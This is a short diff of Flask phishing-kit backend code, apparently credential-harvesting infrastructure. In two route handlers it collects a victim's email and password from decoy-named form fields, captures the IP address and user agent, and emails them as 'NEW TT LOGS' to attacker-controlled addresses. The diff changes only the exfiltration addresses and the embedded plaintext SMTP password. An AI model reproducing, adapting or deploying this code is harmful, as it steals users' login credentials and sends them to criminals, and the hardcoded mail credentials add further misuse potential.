@@ -145,9 +145,9 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsdis@bseng2i.com"
-        receiver_email = "send@hplimn.site"
-        password = "dZB{tjvbEhKV"
+        sender_email = "newreport@bseng2i.com"
+        receiver_email = "newreport@bseng2i.com"
+        password = "MTpzNG.n94-x"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW TT LOGS"
@@ -182,9 +182,9 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "logsdis@bseng2i.com"
-        receiver_email = "send@hplimn.site"
-        password = "dZB{tjvbEhKV"
+        sender_email = "newreport@bseng2i.com"
+        receiver_email = "newreport@bseng2i.com"
+        password = "MTpzNG.n94-x"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW TT LOGS P2"
